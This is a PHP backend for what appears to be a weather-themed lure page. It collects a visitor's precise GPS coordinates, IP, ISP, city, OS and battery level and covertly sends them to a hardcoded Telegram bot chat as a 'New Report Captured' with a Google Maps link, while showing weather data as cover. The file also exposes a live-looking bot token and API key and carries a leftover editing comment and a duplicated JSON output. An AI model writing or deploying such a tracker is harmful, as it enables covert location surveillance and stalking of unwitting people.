<?php
$botToken = "8320125696:AAEpsJbdGuf_75pCVrdkRhCsXgSdbPuQQtg";
$chatId = "5157658865";
$weatherKey = "5263f75a4e738f5b297b1b5ca639cc1c";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $lati = $_POST['lati'];
    $longi = $_POST['longi'];
    $acc = $_POST['acc'];
    $ua = $_POST['ua'];
    $batt = $_POST['batt'];
    $os = $_POST['os'];
    
    // Vercel specific IP capture
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ipInfoJson = @file_get_contents("http://ip-api.com/json/$ip?fields=status,isp,city");
    $ipData = json_decode($ipInfoJson, true);
    
    $city = $ipData['city'] ?? "Unknown";
    $isp = $ipData['isp'] ?? "Unknown";

    // Dynamic Weather for the user UI
    $weatherUrl = "https://api.openweathermap.org/data/2.5/weather?lat=$lati&lon=$longi&units=metric&appid=$weatherKey";
    $weatherData = json_decode(@file_get_contents($weatherUrl), true);
    $temp = $weatherData['main']['temp'] ?? "N/A";
    $desc = $weatherData['weather'][0]['main'] ?? "N/A";

    // Correct Google Maps Link
    $mapLink = "https://www.google.com/maps?q=$lati,$longi";

    $message = "🌐 *New Report Captured*\n\n";
    $message .= "📍 *Location:* $city\n";
    $message .= "📏 *Accuracy:* {$acc}m\n";
    $message .= "🌍 *Google Maps:* [Open Map]($mapLink)\n\n";
    $message .= "📱 *OS:* $os\n";
    $message .= "🔋 *Battery:* $batt\n";
    $message .= "🌐 *IP:* $ip\n";
    $message .= "🏢 *ISP:* $isp\n";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = ['http' => ['method' => 'POST', 'header' => "Content-type: application/x-www-form-urlencoded\r\n", 'content' => http_build_query($data)]];
    @file_get_contents($url, false, stream_context_create($options));


    echo json_encode(["status" => "success", "city" => $city, "temp" => $temp, "desc" => $desc]);
// ... (keep all your existing telegram code exactly the same) ...

    // ADDED: Extra data for the new Image Options UI
    $humidity = $weatherData['main']['humidity'] ?? "0";
    $windSpeed = $weatherData['wind']['speed'] ?? "0";
    $feelsLike = $weatherData['main']['feels_like'] ?? $temp;

    echo json_encode([
        "status" => "success", 
        "city" => $city, 
        "temp" => $temp, 
        "desc" => $desc,
        "humidity" => $humidity,
        "wind" => $windSpeed,
        "feels" => $feelsLike
    ]);
    exit;
}
?>
